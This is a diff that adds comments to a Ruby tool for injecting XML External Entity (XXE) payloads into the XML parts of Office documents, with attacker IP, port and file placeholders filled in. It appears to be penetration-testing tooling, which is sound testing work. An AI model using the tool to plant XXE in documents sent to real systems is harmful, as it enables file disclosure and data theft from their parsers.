@@ -10,8 +10,9 @@ require 'fileutils'
 @ip = ""
 @payload_file = ""
 @port = ""
+@in = "\t"
 
-
+# Keep the payloads organized
 def read_payloads()	
 	pl = {}
 	pl["vanilla_entity"] = '<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>'
@@ -27,6 +28,7 @@ def read_payloads()
 	return pl
 end
 
+# takes in a docx and returns a list of files
 def list_files(docx)
 	files = []
 	Zip::Archive.open(docx, Zip::CREATE) do |zipfile|
@@ -40,6 +42,8 @@ def list_files(docx)
 	return files
 end
 
+# This method retrieves the payloads and allows the user to assign a payload
+#	that will be used in the document. 
 def select_payload
 	ploads = read_payloads()
 	payload = ""
@@ -48,7 +52,7 @@ def select_payload
 		ploads.each do |pload|
 			menu.choice pload[0] do payload = pload end
 		end
-		menu.choice "Print XXE Payload Details" do 
+		menu.choice "Print XXE Payload Values" do 
 			ploads.each do |pload|
 				p pload
 			end
@@ -73,6 +77,8 @@ def select_payload
 	return payload
 end
 
+# this does a simple substitution of the [X]XE into the document DOCTYPE.
+#	It also resets the xml from standalone "yes" to "no"
 def payload(document,payload)
 	# insert the payload, TODO this should be refactored
 	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@ip).gsub('PORT',@port).gsub('FILE',@payload_file)}""")	
@@ -80,6 +86,8 @@ def payload(document,payload)
 	return document
 end
 
+# The meat of the work:
+#	reads in the XML file, inserts XXE and then creates the new OXML
 def add_payload(name,payloadx)
 	document = ""
 	# Read in the XLSX and grab the document.xml
@@ -103,12 +111,14 @@ def add_payload(name,payloadx)
 	end
 end
 
+# Insert the payload into every XML document in the document
 def add_payload_all(fz,payload)
 	fz.each do |name|
 		add_payload(name, payload)
 	end		 
 end
 
+# The menu for selecting the payload and the XML file to insert into
 def choose_file(docx)
 	fz = list_files(docx)
 	payload = select_payload
@@ -123,6 +133,7 @@ def choose_file(docx)
 	end
 end
 
+# The string replacement functionality, it's painfully hardcoded right now
 def find_string
 	if(@input_file.size > 0)
 		puts "|+| Using #{@input_file}"
@@ -191,6 +202,7 @@ def find_string
 	end
 end
 
+# Allow the user to specify their input file
 def list_files_menu
 	if(@input_file.size > 0)
 		puts "|+| Using #{@input_file}"
@@ -214,6 +226,7 @@ def list_files_menu
 	end
 end
 
+# have the user set global variables
 def set_globals
 	choose do |menu|
 		menu.prompt = "Set Global Variables (q to return):"
@@ -241,6 +254,7 @@ def set_globals
 	end
 end
 
+# The main menu
 def main
 	while(true)
 		puts "\n"
